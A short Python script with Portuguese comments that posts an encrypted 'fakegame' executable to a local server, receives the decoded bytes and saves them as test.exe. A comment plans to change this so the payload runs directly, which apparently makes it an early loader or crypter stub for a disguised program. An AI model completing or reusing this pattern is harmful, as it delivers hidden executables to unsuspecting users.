import requests
import base64

#todo: Se autentica

# Lê os bytes criptografados
game_enc = open("fakegame_enc.exe", "rb")
game_code = game_enc.read()

# Envia POST
send_data = {'game': base64.b64encode(game_code)}
response = requests.post("http://127.0.0.1:5000", data=send_data)
game_code = base64.urlsafe_b64decode(response.text)

# Salva arquivo (todo: mudar isso depois para executar diretamente)
with open("test.exe", "wb") as game_rcv:
	game_rcv.write(game_code)

game_enc.close()